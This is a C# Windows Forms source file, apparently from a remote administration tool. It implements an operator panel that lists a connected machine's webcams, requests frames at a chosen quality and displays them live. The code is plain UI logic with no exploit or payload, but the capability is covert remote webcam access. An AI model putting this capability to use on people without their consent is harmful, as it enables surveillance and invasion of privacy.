using System;
using System.Drawing;
using System.Windows.Forms;
using System.Collections.Generic;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    //TODO: Fix Alt + Tab
    public partial class FrmRemoteWebcam : Form
    {
        public bool IsStarted { get; private set; }
        private readonly Client _connectClient;
        private List<Keys> _keysPressed;

        public FrmRemoteWebcam(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRwc = this;

            InitializeComponent();
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);

            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);

            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);

            btnShow.Location = new Point(377, 0);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);

            _keysPressed = new List<Keys>();

            if (_connectClient.Value != null)
                new Core.Packets.ServerPackets.GetWebcams().Execute(_connectClient);
        }

        public void AddWebcams(int webcams)
        {
            try
            {
                cbWebcams.Invoke((MethodInvoker)delegate
                {
                    for (int i = 0; i < webcams; i++)
                        cbWebcams.Items.Add(string.Format("Webcam {0}", i + 1));
                    cbWebcams.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            picWebcam.UpdateImage(bmp, cloneBitmap);
        }

        private void _frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Webcam", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ToggleControls(bool t)
        {
            IsStarted = !t;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    btnStart.Enabled = t;
                    btnStop.Enabled = !t;
                    barQuality.Enabled = t;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!picWebcam.IsDisposed && !picWebcam.Disposing)
                picWebcam.Dispose();
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRwc = null;
        }

        private void FrmRemoteWebcam_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (this.Width/2) - (panelTop.Width/2);
            btnShow.Left = (this.Width/2) - (btnShow.Width/2);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbWebcams.Items.Count == 0)
            {
                MessageBox.Show("No Webcam detected.\nPlease wait till the client sends a list with available Webcams.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ToggleControls(false);

            picWebcam.Start();

            // Subscribe to the new frame counter.
            picWebcam.SetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;

            new Core.Packets.ServerPackets.GetWebcamImage(barQuality.Value, cbWebcams.SelectedIndex).Execute(_connectClient);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleControls(true);

            picWebcam.Stop();

            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picWebcam.UnsetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            this.ActiveControl = picWebcam;
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picWebcam;
        }


        private int GetRemoteWidth(int localX)
        {
            return localX * picWebcam.ScreenWidth / picWebcam.Width;
        }

        private int GetRemoteHeight(int localY)
        {
            return localY * picWebcam.ScreenHeight / picWebcam.Height;
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
            this.ActiveControl = picWebcam;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
            this.ActiveControl = picWebcam;
        }
    }
}